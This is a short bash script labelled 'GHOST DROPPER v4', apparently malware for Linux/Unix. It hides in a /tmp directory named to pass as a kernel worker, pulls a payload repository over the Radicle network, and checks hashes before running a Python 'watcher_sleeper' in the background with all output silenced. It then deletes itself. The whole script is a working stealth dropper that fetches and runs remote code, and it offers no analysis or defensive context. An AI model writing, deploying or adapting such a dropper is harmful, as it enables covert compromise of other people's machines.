#!/bin/bash
# 12TH NAME - GHOST DROPPER v4
# Target: Linux/Unix | Mode: Stealth

WORK_DIR="/tmp/.kworker_$(date +%s)"
RID="rad:z3FRfbSHtnEuq6vPs3jgma1z8q3hx"

mkdir -p $WORK_DIR && cd $WORK_DIR

# 1. Fetch the latest DNA and Manifest
./rad clone $RID --no-confirm > /dev/null 2>&1

# 2. Integrity Check
echo "[*] Verifying DNA Integrity..."
sha256sum -c manifest.sha256 > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[!] Integrity Mismatch. Shredding."
    rm -rf $WORK_DIR
    exit 1
fi

# 3. Execution (Memory-Only)
nohup python3 watcher_sleeper.py > /dev/null 2>&1 &

# 4. Self-Deletion of the Dropper
(sleep 5; rm -- "$0") &
exit 0
